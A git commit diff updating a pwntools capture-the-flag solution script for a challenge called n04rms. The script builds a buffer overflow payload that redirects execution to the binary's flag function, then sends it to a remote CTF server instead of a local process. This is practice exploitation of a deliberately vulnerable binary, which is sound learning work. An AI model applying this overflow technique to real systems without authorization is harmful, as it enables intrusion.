03256468090c91211aebec2ad4143eb3ca49e7bd
Jarrod Pas <jarrod@jarrodpas.com>
2019-02-12 15:19:09 -0700

    Finished n04rms solution

--- pwn/n04rms/own.py
+++ pwn/n04rms/own.py
@@ -4,22 +4,22 @@ from __future__ import print_function
 import sys
 
 from pwn import *
-context.binary = './buf'
+context.binary = b = './n04rms'
 context.terminal = ['tmux', 'splitw', '-v']
 
 if len(sys.argv) > 1:
-    p = gdb.debug('./buf')
+    p = gdb.debug(b)
     pause()
     p.sendline(cyclic(512))
     pause()
     # look at bus error
     sys.exit()
 
-elf = ELF('./buf')
+elf = ELF(b)
 exploit = cyclic(cyclic_find(0x6161616b))
 exploit += p64(elf.symbols[u'flag'])
 
-p = process('./buf')
+p = connect('pwn.ctf.jpas.xyz', 6002)
 p.sendline(exploit)
 p.recvline()
 print(p.recvline(), end='')
